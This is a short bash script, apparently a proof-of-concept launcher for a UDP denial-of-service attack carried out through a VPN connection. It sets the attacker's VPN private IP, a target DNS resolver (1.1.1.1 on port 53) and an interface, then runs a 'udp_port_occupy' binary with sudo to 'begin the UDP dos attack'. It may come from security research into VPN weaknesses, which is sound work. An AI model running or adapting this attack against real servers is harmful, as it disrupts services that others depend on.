# !/bin/bash
ATTACKER_PRIVATE_IP=10.42.110.3; # VPN private IP of the local attacker after connecting with the VPN server
REMOTE_SERVER_IP=1.1.1.1; # Public IP of the remote UDP server or DNS resolver
REMOTE_SERVER_PORT=53; # Remote UDP service port, for example 53 for DNS
PACKET_IFACE="tun0"; # Packet iface of the local attacker after connecting with the VPN server

echo `date`
echo "begin the UDP dos attack to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT}"

sudo ./udp_port_occupy ${ATTACKER_PRIVATE_IP} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${PACKET_IFACE}

echo `date`
